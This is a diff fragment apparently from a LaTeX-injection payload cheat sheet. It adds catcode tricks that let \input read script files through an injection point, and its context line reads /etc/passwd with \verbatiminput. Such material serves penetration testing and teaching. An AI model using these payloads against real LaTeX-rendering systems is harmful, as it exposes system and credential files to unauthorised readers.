@@ -38,6 +38,18 @@ Read text file, **without** interpreting the content, it will only paste raw fil
 \verbatiminput{/etc/passwd}
 ```
 
+If injection point is past document header (`\usepackage` cannot be used), some control 
+characters can be deactivated in order to use `\input` on file containing `$`, `#`, 
+`_`, `&`, null bytes, ... (eg. perl scripts).
+
+```tex
+\catcode `\$=12
+\catcode `\#=12
+\catcode `\_=12
+\catcode `\&=12
+\input{path_to_script.pl}
+```
+
 ## Write file
 
 Write single lined file:
